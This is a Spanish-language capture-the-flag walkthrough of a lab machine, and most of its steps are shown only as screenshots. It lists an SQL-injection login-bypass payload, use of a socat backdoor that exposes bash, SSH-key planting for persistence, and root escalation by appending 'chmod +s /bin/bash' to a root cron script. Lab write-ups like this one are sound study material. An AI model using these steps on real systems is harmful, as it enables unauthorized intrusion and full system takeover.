![alt text](image-33.png)
![alt text](image-34.png)

dirsearch .u 172.17.0.2
![alt text](image-35.png)

Intentamos hacer SQL Injections. podemos apoyarnos de ->[Github](https://github.com/austinsonger/SQL-Injection-Authentication-Bypass-Cheat-Sheet)


admin
test' or '1'='1' -- -

![alt text](image-36.png)

![alt text](image-37.png)

![alt text](image-38.png)

conx          54  0.0  0.0   9288  3620 ?        S    17:10   0:00 socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash

![alt text](image-39.png)

Nos conectamos a conx a traves de una backdoor
![alt text](image-41.png)
Generamos una clave SSH para autenticarnos sin contraseña
![alt text](image-45.png)
Levantamos un SV web para exponer la clave publica
![alt text](image-46.png)
## Inyectamos la clave en la maquina victima
Desde la sesion, se decarga la clave publica y la configuramos para acceso persistente
![alt text](image-47.png)
![alt text](image-48.png)
![alt text](image-50.png)
Esto habilita el acceso **SSH** sin contraseña como conx desde mi maquina 
![alt text](image-49.png)
## Enumeracion de con jobs
Explorando /etc/cron.d/, encontramos un cron ejecutado por root:
![alt text](image-51.png)
![alt text](image-52.png)

* * * * * root bash /var/backups/backup.sh
Este script se ejecuta cada minuto como root

## Escalada a root mediante SUID
Modificamos el script para añadir el bit SUID a /bin/bash
**echo 'chmod +s /bin/bash' >> /var/backups/backup.sh**
despues de que se ejecuta el cron se verifica
**ls -la /bin/bash**
el resultado nos demuestra que, esto permite ejecutar bash como root desde cualquier usuario

## Obtencion del ROOT

se ejecuta el comando, un minuto despues (Se debe esperar 1 minuto)
**/bin/bash -p**

y por ultimo confirmamos quien somos con **whoami** y vemos que obtuvimos **Root**